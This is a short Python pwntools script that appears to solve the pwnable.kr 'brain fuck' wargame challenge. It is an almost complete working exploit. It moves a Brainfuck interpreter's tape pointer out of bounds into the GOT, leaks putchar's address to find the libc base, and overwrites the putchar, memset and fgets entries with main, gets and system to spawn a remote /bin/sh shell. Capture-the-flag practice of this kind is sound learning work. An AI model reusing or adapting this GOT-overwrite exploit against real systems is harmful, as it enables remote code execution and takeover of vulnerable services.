###OOB

from pwn import *

###Addr
#  libc2.23
putchar_got = 0x804a030
putchar_offset = 0x61920
memset_got = 0x804a02c
fgets_got = 0x804a010
gets_offset = 0x5f3e0
system_offset = 0x3ada0
main = 0x8048671
tape = 0x804a0a0

###Exploit
#  experiment shows that memset and strlen comes from another library, can't use them to calculate offset
r = remote('pwnable.kr',9001)

#shift ptr to got table
shift1 = '<'*(tape-putchar_got-4)
#fill putchar got
dummy_print = '.'
#leak putchar addr
leak = '<.'*4
#write putchar_got to main
shift2 = '>'*4
overwrite1 = '<,'*4
#write memset_got to gets
shift3 = '<'*(putchar_got-memset_got-4)
overwrite2 = '<,'*4
#write fgets_got to system
shift4 = '<'*(memset_got-fgets_got-4)
overwrite3 = '<,'*4
#trigger payload
trigger = '.'

payload = shift1+dummy_print+leak+shift2+overwrite1+shift3+overwrite2+shift4+overwrite3+trigger
r.sendlineafter('[ ]\n',payload)

r.recv(1)
putchar_addr = u32(r.recv(4)[::-1])
libc_base = putchar_addr-putchar_offset

r.send(p32(main)[::-1])
r.send(p32(libc_base+gets_offset)[::-1])
r.send(p32(libc_base+system_offset)[::-1])

r.sendline('/bin/sh')
r.interactive()
